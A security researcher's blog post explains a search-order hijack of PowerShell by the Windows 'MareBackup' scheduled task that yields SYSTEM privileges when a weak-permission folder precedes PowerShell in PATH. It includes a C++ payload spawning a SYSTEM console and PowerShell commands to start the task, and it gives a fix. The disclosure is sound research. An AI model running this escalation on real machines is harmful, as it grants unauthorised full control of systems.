---
title: "Hijacking the Windows \"MareBackup\" Scheduled Task for Privilege Escalation"
layout: "post"
categories: [ "Privilege Escalation" ]
tags: [ "Exploit", "Privilege Escalation" ]
---

The built-in "MareBackup" scheduled task is susceptible to a trivial executable search order hijacking, which can be abused by a low-privileged user to gain `SYSTEM` privileges whenever a vulnerable folder is prepended to the system's `PATH` environment variable (instead of being appended).

As I was working on a semi-automated research project on an unrelated subject, I generated and collected a lot of data with Process Monitor. So, I decided to have a quick look and applied the basic search filters for DLL search order hijacking, just to see if something would come out, even if it was not my initial objective. This is how I observed the following behavior.

![Process Monitor showing the execution of PowerShell by `CompatTelRunner.exe`](/assets/posts/2025-05-20-hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/procmon-powershell-search-order.png)
*Process Monitor showing the execution of PowerShell by `CompatTelRunner.exe`*

We have an executable named `CompatTelRunner.exe`, running as `NT AUTHORITY\SYSTEM`, and executing PowerShell, apparently without specifying its absolute path because we can see that it uses the typical executable search order documented [here](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw).

The Python `PATH` entries are highlighted here because Python was known in the past for inserting folders configured with (default) weak permissions in the system's `PATH` environment variable. This issue has since been addressed in the Python installer, and therefore this behavior wouldn't be exploitable here.

Besides, contrary to a typical Ghost DLL hijacking, where `LoadLibrary` would go through all the `PATH` entries because the target file doesn't exist, here the hijacking would work only if a vulnerable entry was prepended to the list, instead of being appended, because the legitimate `powershell.exe` would be found eventually.

![Hypothetical PowerShell search order hijacking](/assets/posts/2025-05-20-hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/diagram-powershell-hijacking.png)
*Hypothetical PowerShell search order hijacking*

Now, assuming that such a vulnerable folder exists, is this behavior really exploitable, and can we trigger it as a low-privileged user? You guessed it, the answer to both of these questions is "*yes*". Let me walk you through a quick analysis.

In total, Process Monitor recorded 13 "Process Create" events for `powershell.exe`. They are all similar so the one shown below was just picked at random. The "Event" tab shows the following command line being executed. Nothing really interesting there.

```powershell
powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
```

![Process Monitor - PowerShell process create event details](/assets/posts/2025-05-20-hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/procmon-process-create-powershell-event.png)
*Process Monitor - PowerShell process create event details*

The "Process" tab shows the following command line for the parent process. It also confirms that it runs as `NT AUTHORITY\SYSTEM` in session `0`. So, we are sure there is no user impersonation involved here.

```batch
"C:\WINDOWS\system32\compattelrunner.exe" -m:appraiser.dll -f:DoScheduledTelemetryRun
```

![Process Monitor - Parent process details](/assets/posts/2025-05-20-hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/procmon-process-create-powershell-process-details.png)
*Process Monitor - Parent process details*

The "Stack" tab shows that the `CreateProcessW` call originated from a function named `PowerShellMatchingPlugin` in `acmigration.dll`.

![Process Monitor - Stack trace leading to the `CreateProcessW` call](/assets/posts/2025-05-20-hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/procmon-process-create-powershell-stack.png)
*Process Monitor - Stack trace leading to the `CreateProcessW` call*

Now, there is a bit of information I already knew, but it was also possible to make an educated guess. The keywords `appraiser` and `ScheduledTelemetry` put me on the right track immediately. I've seen the first one on multiple occasions in a few built-in scheduled tasks, and the second one kind of hints in that direction as well.

We can use PowerShell to quickly enumerate all the scheduled tasks and find the ones with a "command line" action containing the keyword `DoScheduledTelemetryRun`. As a side note, this enumeration should be done as an administrator to ensure that all registered tasks are checked, not just the ones visible to low-privileged users.

```console
PS C:\WINDOWS\system32> Get-ScheduledTask | ? { $_.Actions.Arguments -like "*DoScheduledTelemetryRun*" } | select TaskPath,TaskName,Description,State | fl

TaskPath    : \Microsoft\Windows\Application Experience\
TaskName    : MareBackup
Description : Gathers Win32 application data for App Backup scenario
State       : Ready

TaskPath    : \Microsoft\Windows\Application Experience\
TaskName    : Microsoft Compatibility Appraiser Exp
Description : Collects program telemetry information if opted-in to the Microsoft Customer Experience Improvement Program.
State       : Ready
```

The result shows two candidate scheduled tasks, `MareBackup` and `Microsoft Compatibility Appraiser Exp`, which are both registered under "Application Experience".

![Task Scheduler - Application Experience scheduled tasks](/assets/posts/2025-05-20-hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/task-scheduler-candidate-tasks.png)
*Task Scheduler - Application Experience scheduled tasks*

At this point, we have all the information we need, but just out of curiosity, I opened the file `acmigration.dll`, from which the `CreateProcessW` originates, in Ghidra, to take a look at the `PowerShellMatchingPlugin` function. Unfortunately, Ghidra was not able to reconstruct the initialization of the command line, so I'll just highlight the `CreateProcessW` API call. Apart from the fact that it specifies the creation flag `CREATE_NO_WINDOW`, there is nothing special here either.

![Ghidra - `CreateProcessW` being called from `acmigration!PowerShellMatchingPlugin`](/assets/posts/2025-05-20-hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/ghidra-powershellmatchingplugin.png)
*Ghidra - `CreateProcessW` being called from `acmigration!PowerShellMatchingPlugin`*

The last question is "*can we trigger or start at least one of these two scheduled tasks as a low-privileged user?*". The first one doesn't have any trigger registered, and the second one only has one custom trigger. This is not encouraging, but we can try to start them manually using either `schtasks.exe` or the PowerShell cmdlet `Start-ScheduledTask`.

![PowerShell - Attempting to start the two candidate scheduled tasks](/assets/posts/2025-05-20-hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/powershell-start-scheduled-tasks.png)
*PowerShell - Attempting to start the two candidate scheduled tasks*

We get an "access denied" error when attempting to start `Microsoft Compatibility Appraiser Exp`, but the other one seems to work. To understand why that is, we should take a look at their DACLs, but there is no easy way to do that within the Task Scheduler GUI. However, since I implemented DACL checks for scheduled tasks in [PrivescCheck](https://github.com/itm4n/PrivescCheck), I can use that to my advantage.

![PowerShell - "MareBackup" scheduled task permission check](/assets/posts/2025-05-20-hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/powershell-scheduled-task-permissions.png)
*PowerShell - "MareBackup" scheduled task permission check*

Note that there is actually an easier way to achieve the same result. We can check the DACL of the XML file containing the scheduled task's definition.

!["MareBackup" scheduled task permission check with icacls](/assets/posts/2025-05-20-hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/cmd-icacls-scheduled-task-file.png)
*"MareBackup" scheduled task permission check with icacls*

Whichever method is used, we can see that the `BUILTIN\Users` identity has `AllAccess`, or `FullControl`, over the scheduled task. "*So, that means I can modify the scheduled task as a low-privileged user and achieve LPE? That's an 0-day!*"

The result of the `icacls` command shows that we have full control over the scheduled task file, but that doesn't serve any purpose since there is a checksum stored in the registry, and an integrity check is performed by the `Schedule` service when the tasks are loaded. Theoretically, the only way to modify a scheduled task is through the `Schedule` service using RPC, and all the procedures verify that the client has administrator privileges. The only exception that I'm aware of is the one used for enabling / disabling tasks.

So, no actual vulnerability here, but this does explain why we can start the scheduled task manually without administrator privileges.

One question remains, what about the payload? Well, we don't really care about preserving the original feature. It's just a scheduled task for collecting telemetry data after all, it's not system-critical, so we can execute whatever we want without having to ensure that the PowerShell commands are actually executed. In addition, the `Schedule` service will use the default `SYSTEM` token, which has `SeTcbPrivilege` enabled. Therefore, I opted for my personal favorite: spawning a `SYSTEM` console on the user's desktop (original code [here](https://googleprojectzero.blogspot.com/2016/01/raising-dead.html)).

```cpp
HANDLE hToken = NULL, hTokenDup = NULL;
STARTUPINFO si = { 0 };
PROCESS_INFORMATION pi = { 0 };
LPCWSTR pwszApplication = L"cmd.exe";
DWORD dwSessionId = 1; // Set to the target user's session ID
                       // (or invoke WTSGetActiveConsoleSessionId() to get the console session ID)

// Error checks were removed for conciseness
OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &hToken);
DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityAnonymous, TokenPrimary, &hTokenDup);
SetTokenInformation(hTokenDup, TokenSessionId, &dwSessionId, sizeof(dwSessionId));

si.cb = sizeof(si);
si.wShowWindow = SW_SHOW;
si.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");

CreateProcessAsUserW(hTokenDup, pwszApplication, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
CloseHandle(hTokenDup);
CloseHandle(hToken);
```

Finally, below is a list of all the commands you'll need to check for and exploit this "*vulnerability*". The only thing to pay attention to is whether a `PATH` folder entry with weak permissions is placed before the default Windows PowerShell folder path.

```powershell
# Check the system PATH
Get-ItemProperty -Path "Registry::HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -Name "Path" | Select-Object -ExpandProperty Path
# Check whether the scheduled task exists and is enabled
Get-ScheduledTask -TaskName "MareBackup"
# Enable the scheduled task if needed
Enable-ScheduledTask -TaskPath "\Microsoft\Windows\Application Experience" -TaskName "MareBackup"
# Start the scheduled task
Start-ScheduledTask -TaskPath "\Microsoft\Windows\Application Experience" -TaskName "MareBackup"
```

> In the video below, the user is named "Admin", and is indeed a member of the local "Administrators" group, but everything is done under "medium" integrity since User Account Control (UAC) is enabled, so the PowerShell process doesn't have administrator privileges.
{: .prompt-info}

{% include embed/video.html src='/assets/posts/2025-05-20-hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/poc.webm' title='Exploitation of the PrintNightmare vulnerability' muted=true %}

The term "*vulnerability*" is obviously not appropriate here because the actual vulnerability lies in the fact that a folder with weak permissions was inserted in the system's `PATH` environment variable. Nonetheless, it is possible to avoid such a behavior by constructing the absolute path of `powershell.exe` before calling `CreateProcess`, rather than relying on a potentially hijackable search order.

That's all for this post, it was a rather short one for once. Back to my main project now... :wink:
